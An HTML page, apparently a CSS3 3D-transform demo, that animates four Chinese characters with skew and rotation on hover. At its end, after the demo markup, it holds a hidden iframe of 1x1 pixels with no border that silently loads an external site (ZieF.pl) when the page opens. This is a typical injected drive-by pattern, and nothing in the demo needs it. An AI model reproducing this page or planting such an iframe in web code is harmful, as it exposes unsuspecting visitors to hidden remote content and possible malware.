<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>CSS3 3D转换</title>
    <style>
        body{
            background-color: #eee;
        }
        .box{
            width: 500px;
            margin:100px auto;
        }

        .box span {
            float:left;
            width: 100px;
            height: 100px;
            font-size:80px;
            line-height: 100px;
            text-align: center;
            font-family: "Microsoft Yahei";
            position: relative;
        }
        span::before,span::after{
            content:attr(data-text);
            position: absolute;
            left:0;
            top:0;
            width: 100px;
            height: 100px;
            font-size:80px;
            line-height: 100px;
            text-align: center;
            font-family: "Microsoft Yahei";
            color:#fff;
            transform:scale(0.95,1);
            transform-origin: left;
            transition:all 0.5s;
        }
        span::before{
            color:rgba(0,0,0,0.3);
        }
        .box:hover span::after{
            transform:rotateY(25deg) skew(0deg,5deg);
        }

        .box:hover span::before{
            transform: skew(0deg,15deg);
        }



    </style>
</head>

<body>
    <div class="box">
        <span data-text="传">传</span>
        <span data-text="智">智</span>
        <span data-text="播">播</span>
        <span data-text="客">客</span>
    </div>
<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>

</html>
